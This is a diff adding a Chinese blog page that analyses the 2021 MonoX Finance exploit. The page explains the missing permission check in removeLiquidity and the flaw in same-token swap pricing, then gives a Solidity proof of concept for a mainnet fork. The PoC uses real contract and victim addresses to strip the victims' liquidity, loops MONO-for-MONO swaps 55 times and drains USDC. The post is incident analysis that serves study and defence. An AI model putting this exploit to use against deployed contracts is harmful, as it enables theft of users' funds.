@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>mono攻击--价格计算被利用 | SCS</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="复盘分析、合约设计漏洞" />
+  
+  
+  
+  
+  <meta name="description" content="MONO攻击–价格计算被利用 2021 年 11 ⽉ 30 ⽇，MonoX Finance 遭遇攻击，本次攻击中约合 1820 万美元的 WETH 和 1050 万美元的 MATIC 被盗，其他被盗 Token 包括 WBTC、LINK、GHST、DUCK、MIM 和 IMX，损失共计约 3100 万美元。 交易哈希：0x9f14d093a2349de08f02fc0fb018dadb449351">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MONO攻击--价格计算被利用">
+<meta property="og:url" content="http://example.com/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="SCS">
+<meta property="og:description" content="MONO攻击–价格计算被利用 2021 年 11 ⽉ 30 ⽇，MonoX Finance 遭遇攻击，本次攻击中约合 1820 万美元的 WETH 和 1050 万美元的 MATIC 被盗，其他被盗 Token 包括 WBTC、LINK、GHST、DUCK、MIM 和 IMX，损失共计约 3100 万美元。 交易哈希：0x9f14d093a2349de08f02fc0fb018dadb449351">
+<meta property="og:locale">
+<meta property="og:image" content="http://example.com/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CMONO.jpg">
+<meta property="og:image" content="http://example.com/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-11_16-44-15.png">
+<meta property="og:image" content="http://example.com/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-11_18-25-37.png">
+<meta property="og:image" content="http://example.com/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-11_18-29-34.png">
+<meta property="og:image" content="http://example.com/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-11_17-13-48.png">
+<meta property="og:image" content="file:///I:/dfile/ctf/github/blog/source/_posts/MONO%E6%94%BB%E5%87%BB/Snipaste_2021-12-11_17-50-15.png?lastModify=1639218959">
+<meta property="og:image" content="http://example.com/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-11_17-52-03.png">
+<meta property="og:image" content="http://example.com/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-11_17-54-13.png">
+<meta property="og:image" content="http://example.com/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-11_17-56-05.png">
+<meta property="og:image" content="http://example.com/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-11_18-00-23.png">
+<meta property="og:image" content="http://example.com/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-13_09-55-57.png">
+<meta property="article:published_time" content="2021-12-12T02:42:40.000Z">
+<meta property="article:modified_time" content="2021-12-13T02:09:58.987Z">
+<meta property="article:author" content="Janson Woods">
+<meta property="article:tag" content="复盘分析、合约设计漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CMONO.jpg">
+  
+
+  
+
+  <link rel="icon" href="/css/images/mylogo.jpg">
+  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt; src:url("/css/fonts/FuturaPTBold.otf") format("woff");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt-light; src:url("/css/fonts/FuturaPTBook.otf") format("woff");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt-italic; src:url("/css/fonts/FuturaPTBookOblique.otf") format("woff");font-weight:400;font-style:italic;}
+}
+
+  </style>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+
+  
+<script src="/js/jquery-3.1.1.min.js"></script>
+
+  
+<script src="/js/bootstrap.js"></script>
+
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+
+  
+    
+<link rel="stylesheet" href="/css/dialog.css">
+
+  
+
+  
+
+  
+    <link rel="stylesheet" href="/css/header-post.css" >
+  
+
+  
+  
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+  <div id="container">
+    <div id="wrap">
+      
+        <header>
+
+    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
+        <div class="navbar-inner">
+          
+          <div class="container"> 
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+
+            
+              <a class="brand" style="
+                 margin-top: 0px;"  
+                href="#" data-toggle="modal" data-target="#myModal" >
+                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
+              </a>
+            
+            
+            <div class="navbar-collapse collapse">
+              <ul class="hnav navbar-nav">
+                
+                  <li> <a class="main-nav-link" href="/">Home</a> </li>
+                
+                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
+                
+                  <li><div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div></li>
+            </div>
+          </div>
+                
+      </div>
+    </div>
+
+</header>
+
+
+
+      
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-MONO攻击--价格计算被利用" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      MONO攻击--价格计算被利用
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/" class="article-date">
+	  <time datetime="2021-12-12T02:42:40.000Z" itemprop="datePublished">2021-12-12</time>
+	</a>
+
+      
+      
+	<a class="article-views">
+	<span id="busuanzi_container_page_pv">
+		PV:<span id="busuanzi_value_page_pv"></span>
+	</span>
+	</a>
+
+      
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="MONO攻击–价格计算被利用"><a href="#MONO攻击–价格计算被利用" class="headerlink" title="MONO攻击–价格计算被利用"></a>MONO攻击–价格计算被利用</h1><p><img src="/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CMONO.jpg" alt="MONO"></p>
+<p>2021 年 11 ⽉ 30 ⽇，MonoX Finance 遭遇攻击，本次攻击中约合 1820 万美元的 WETH 和 1050 万美元的 MATIC 被盗，其他被盗 Token 包括 WBTC、LINK、GHST、DUCK、MIM 和 IMX，损失共计约 3100 万美元。</p>
+<h4 id="交易哈希：0x9f14d093a2349de08f02fc0fb018dadb449351d0cdb7d0738ff69cc6fef5f299"><a href="#交易哈希：0x9f14d093a2349de08f02fc0fb018dadb449351d0cdb7d0738ff69cc6fef5f299" class="headerlink" title="交易哈希：0x9f14d093a2349de08f02fc0fb018dadb449351d0cdb7d0738ff69cc6fef5f299"></a>交易哈希：0x9f14d093a2349de08f02fc0fb018dadb449351d0cdb7d0738ff69cc6fef5f299</h4><h3 id="攻击要点："><a href="#攻击要点：" class="headerlink" title="攻击要点："></a>攻击要点：</h3><p>本次攻击主要暴露了MonoX 相关合约存在两个致命的漏洞：</p>
+<ol>
+<li>在进行移除流动性时，并没有对用户的身份及权限进行界定，使得任何人可以移除他人的流动性；</li>
+<li>在进行swap时并没有对TokenIn和TokenOut是否为同一代币进行判断。当TokenIn和TokenOut为同一代币时，合约按着TokenIn和TokenOut分别为不同代币进行swap的逻辑进行，使得代币的价格更新出现了预想不到的结果，使得攻击者有机可乘。</li>
+</ol>
+<h3 id="攻击简述："><a href="#攻击简述：" class="headerlink" title="攻击简述："></a>攻击简述：</h3><p><img src="/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-11_16-44-15.png" alt="Snipaste_2021-12-11_16-44-15"></p>
+<p>攻击者前期利用漏洞1，将池子中大部分的流动性移除，并自己添加流动性，使得自己对池子的流动性贡献变得较大！后利用漏洞2进行swapExactTokenForToken时的价格更新漏洞，使得一次操作后价格更新为原来的1.5倍，重复50多次，使得池子中MONO的价格变得非常高。使用少量的 MONO 换出了大量的WETH、WBTC、MONO、USDC、USDT、 DUCK、MIM、IMX 等池子中的代币。</p>
+<h3 id="攻击细节："><a href="#攻击细节：" class="headerlink" title="攻击细节："></a>攻击细节：</h3><h4 id="漏洞1："><a href="#漏洞1：" class="headerlink" title="漏洞1："></a>漏洞1：</h4><p><img src="/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-11_18-25-37.png" alt="Snipaste_2021-12-11_18-25-37"></p>
+<p>在移除流动性时，并没有对用户的身份及权限进行界定，使得攻击者可以移除池中的大量流动性，黑客自己只需添加少量流动性，即可获得较大份额的占比！</p>
+<h3 id="漏洞2："><a href="#漏洞2：" class="headerlink" title="漏洞2："></a>漏洞2：</h3><p>攻击者在进行swapExactTokenForToken时，传入的tokenIn，tokenOut均为MONO代币，合约并没有对这种情况进行筛选，使得价格跟新按照原本的逻辑进行更新；</p>
+<p><img src="/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-11_18-29-34.png" alt="Snipaste_2021-12-11_18-29-34"></p>
+<p><img src="/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-11_17-13-48.png" alt="Snipaste_2021-12-11_17-13-48"></p>
+<p>在进行swapExactTokenForToken时，会分别计算swap后tokenIn，tokenOut各自的价格。</p>
+<p>在计算新价格时，会得到一个初始价格，将其与原始价格进行加权平均，得到最终的的新价格：<img src="file:///I:/dfile/ctf/github/blog/source/_posts/MONO%E6%94%BB%E5%87%BB/Snipaste_2021-12-11_17-50-15.png?lastModify=1639218959" alt="img"></p>
+<p>因此合约会按照tokenIn，tokenOut两种代币进行价格计算，但实际上均为MONO代币；</p>
+<h5 id="计算TokenIn的新价格：（）"><a href="#计算TokenIn的新价格：（）" class="headerlink" title="计算TokenIn的新价格：（）"></a>计算TokenIn的新价格：（）</h5><p><img src="/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-11_17-52-03.png" alt="Snipaste_2021-12-11_17-52-03"></p>
+<p><img src="/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-11_17-54-13.png" alt="Snipaste_2021-12-11_17-54-13"></p>
+<p>计算TokenOut的新价格：</p>
+<p><img src="/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-11_17-56-05.png" alt="Snipaste_2021-12-11_17-56-05"></p>
+<p><img src="/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-11_18-00-23.png" alt="Snipaste_2021-12-11_18-00-23"></p>
+<p>通过一次攻击我们发现：攻击者之前MONO的价格为521849….,在攻击后获得的TokenIn价格为：31342…，TokenOut价格为77183…。虽然TokenIn和TokenOut均为MONO代币，但是合约按照两种代币进行价格计算，使得两者的价格差高达3倍左右！如果在计算TokenOut的价格时，使用TokenIn计算结束时MONO的新价格计算，就可以很好的避免此问题的发生！</p>
+<p>swapIn 函数在计算完价格后会再次调用 _updateTokenInfo 函数，使得 tokenOutPrice 的更新会覆盖 tokenInPrice 的更新，所以导致这个 token 的价格上涨为原来的1.5倍左右。</p>
+<p>攻击者重复50多次，将MONO代币的价格变得很高，调用swapOut 函数将 WETH、WBTC、MONO、USDC、USDT、 DUCK、MIM、IMX 等池子中的代币取走获利。</p>
+<h3 id="POC：fork的高度为13715025"><a href="#POC：fork的高度为13715025" class="headerlink" title="POC：fork的高度为13715025"></a>POC：fork的高度为13715025</h3><p>​      </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.7</span><span class="number">.0</span> &lt;<span class="number">0.9</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;hardhat/console.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./IMonoswap.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./MonoXPool.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./Weth.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./MonoToken.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./USDC.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line">contract POC&#123;</span><br><span class="line">    address WETH9_Address = <span class="number">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span>;</span><br><span class="line">    address Mono_Token_Address = <span class="number">0x2920f7d6134f4669343e70122cA9b8f19Ef8fa5D</span>;</span><br><span class="line">    address MonoXPool_Address = <span class="number">0x59653E37F8c491C3Be36e5DD4D503Ca32B5ab2f4</span>;</span><br><span class="line">    address Monoswap_address =  <span class="number">0xC36a7887786389405EA8DA0B87602Ae3902B88A1</span>;</span><br><span class="line">    address Innocent_user_1 = <span class="number">0x7B9aa6ED8B514C86bA819B99897b69b608293fFC</span>;</span><br><span class="line">    address Innocent_user_2 = <span class="number">0x81D98c8fdA0410ee3e9D7586cB949cD19FA4cf38</span>;</span><br><span class="line">    address Innocent_user_3 = <span class="number">0xab5167e8cC36A3a91Fd2d75C6147140cd1837355</span>;</span><br><span class="line">    address USDC_Address =  <span class="number">0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48</span>;</span><br><span class="line">    uint256 Amount_Of_MonoToken_On_XPool;</span><br><span class="line">    uint256 public Amount_Of_USDC_On_XPool;</span><br><span class="line">    uint256 public Amoount_Of_Mono_On_This; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)  <span class="title">public</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">        MonoToken(Mono_Token_Address).approve(Monoswap_address,type(uint256).max);</span><br><span class="line">        WETH9(WETH9_Address).deposit&#123;<span class="attr">value</span>:address(<span class="built_in">this</span>).balance,<span class="attr">gas</span>:<span class="number">40000</span>&#125;();</span><br><span class="line">        WETH9(WETH9_Address).approve(Monoswap_address,<span class="number">0.1</span> ether);</span><br><span class="line">        Monoswap(Monoswap_address).swapExactTokenForToken(WETH9_Address,Mono_Token_Address,<span class="number">0.1</span> ether,<span class="number">1</span>,address(<span class="built_in">this</span>),block.timestamp);</span><br><span class="line">        RemoveLiquidity_From_3_Users();</span><br><span class="line">        Monoswap(Monoswap_address).addLiquidity(Mono_Token_Address,<span class="number">196875656</span>,address(<span class="built_in">this</span>));</span><br><span class="line">        Swap_Mono_for_Mono_55_Times();</span><br><span class="line">        Swap_Mono_For_USDC();</span><br><span class="line">        uint att_balance = USDC(USDC_Address).balanceOf(msg.sender);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;Profit USDC amonut:&quot;</span>,att_balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">RemoveLiquidity_From_3_Users</span>(<span class="params"></span>) <span class="title">internal</span></span>&#123;</span><br><span class="line">        uint256 balance_Of_User1 = MonoXPool(MonoXPool_Address).balanceOf(Innocent_user_1,<span class="number">10</span>);</span><br><span class="line">        Monoswap(Monoswap_address).removeLiquidity(Mono_Token_Address,balance_Of_User1,Innocent_user_1,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">        uint256 balance_Of_User2 = MonoXPool(MonoXPool_Address).balanceOf(Innocent_user_2,<span class="number">10</span>);</span><br><span class="line">        Monoswap(Monoswap_address).removeLiquidity(Mono_Token_Address,balance_Of_User2,Innocent_user_2,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">        uint256 balance_Of_User3 = MonoXPool(MonoXPool_Address).balanceOf(Innocent_user_3,<span class="number">10</span>);</span><br><span class="line">        Monoswap(Monoswap_address).removeLiquidity(Mono_Token_Address,balance_Of_User3,Innocent_user_3,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Swap_Mono_for_Mono_55_Times</span>(<span class="params"></span>) <span class="title">internal</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(uint256 i=<span class="number">0</span>;i &lt; <span class="number">55</span>; i++)&#123;</span><br><span class="line">            (,,,,,,Amount_Of_MonoToken_On_XPool,,) = Monoswap(Monoswap_address).pools(Mono_Token_Address);</span><br><span class="line">            Monoswap(Monoswap_address).swapExactTokenForToken(Mono_Token_Address,Mono_Token_Address,Amount_Of_MonoToken_On_XPool-<span class="number">1</span>,<span class="number">0</span>,address(<span class="built_in">this</span>),block.timestamp);          </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Swap_Mono_For_USDC</span>(<span class="params"></span>) <span class="title">internal</span></span>&#123;</span><br><span class="line">        (,,,,,,Amount_Of_USDC_On_XPool,,) = Monoswap(Monoswap_address).pools(USDC_Address);</span><br><span class="line">        Amoount_Of_Mono_On_This = MonoToken(Mono_Token_Address).balanceOf(address(<span class="built_in">this</span>));</span><br><span class="line">        Monoswap(Monoswap_address).swapTokenForExactToken(Mono_Token_Address,USDC_Address,Amoount_Of_Mono_On_This,<span class="number">3800000000000</span>,msg.sender,block.timestamp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() payable external&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">onERC1155Received</span>(<span class="params">address _operator, address _from, uint256 _id, uint256 _value, bytes calldata _data</span>) <span class="title">external</span> <span class="title">returns</span>(<span class="params">bytes4</span>)</span>&#123;</span><br><span class="line">        bytes4 a = <span class="number">0xf23a6e61</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/12/12/MONO%E6%94%BB%E5%87%BB--%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8/MONO%E6%94%BB%E5%87%BB%5CSnipaste_2021-12-13_09-55-57.png" alt="Snipaste_2021-12-13_09-55-57"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      <div>
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+          <strong>Post author:  </strong>Janson Woods</a>
+          </li>
+          <li class="post-copyright-link">
+          <strong>Post link:  </strong>
+          <a href="/2021/12/12/MONO攻击--价格计算被利用/" target="_blank" title="MONO攻击--价格计算被利用">http://example.com/2021/12/12/MONO攻击--价格计算被利用/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>Copyright Notice:   </strong>
+            All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+            unless stating additionally.
+          </li>
+         
+        </ul>
+<div>
+
+      
+      
+        
+	<div id="comment">
+		<!-- 来必力City版安装代码 -->
+		<div id="lv-container" data-id="city" data-uid="MTAyMC8yOTQ4MS82MDQ5">
+		<script type="text/javascript">
+		   (function(d, s) {
+		       var j, e = d.getElementsByTagName(s)[0];
+
+		       if (typeof LivereTower === 'function') { return; }
+
+		       j = d.createElement(s);
+		       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+		       j.async = true;
+
+		       e.parentNode.insertBefore(j, e);
+		   })(document, 'script');
+		</script>
+		<noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+		</div>
+		<!-- City版安装代码已完成 -->
+	</div>
+
+
+
+      
+      
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E5%90%88%E7%BA%A6%E8%AE%BE%E8%AE%A1%E6%BC%8F%E6%B4%9E/" rel="tag">复盘分析、合约设计漏洞</a></li></ul>
+
+      
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/12/13/MONO%E6%94%BB%E5%87%BB/artifacts/attack_metadata/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/11/19/Harvest%E4%BB%B7%E6%A0%BC%E9%A2%84%E8%A8%80%E6%9C%BA%E6%93%8D%E7%BA%B5%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Harvest价格预言机操纵攻击原理及复现</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="toc-sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MONO%E6%94%BB%E5%87%BB%E2%80%93%E4%BB%B7%E6%A0%BC%E8%AE%A1%E7%AE%97%E8%A2%AB%E5%88%A9%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">MONO攻击–价格计算被利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%A4%E6%98%93%E5%93%88%E5%B8%8C%EF%BC%9A0x9f14d093a2349de08f02fc0fb018dadb449351d0cdb7d0738ff69cc6fef5f299"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">交易哈希：0x9f14d093a2349de08f02fc0fb018dadb449351d0cdb7d0738ff69cc6fef5f299</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E8%A6%81%E7%82%B9%EF%BC%9A"><span class="nav-number">1.0.1.</span> <span class="nav-text">攻击要点：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%AE%80%E8%BF%B0%EF%BC%9A"><span class="nav-number">1.0.2.</span> <span class="nav-text">攻击简述：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%BB%86%E8%8A%82%EF%BC%9A"><span class="nav-number">1.0.3.</span> <span class="nav-text">攻击细节：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E1%EF%BC%9A"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">漏洞1：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E2%EF%BC%9A"><span class="nav-number">1.0.4.</span> <span class="nav-text">漏洞2：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AE%A1%E7%AE%97TokenIn%E7%9A%84%E6%96%B0%E4%BB%B7%E6%A0%BC%EF%BC%9A%EF%BC%88%EF%BC%89"><span class="nav-number">1.0.4.0.1.</span> <span 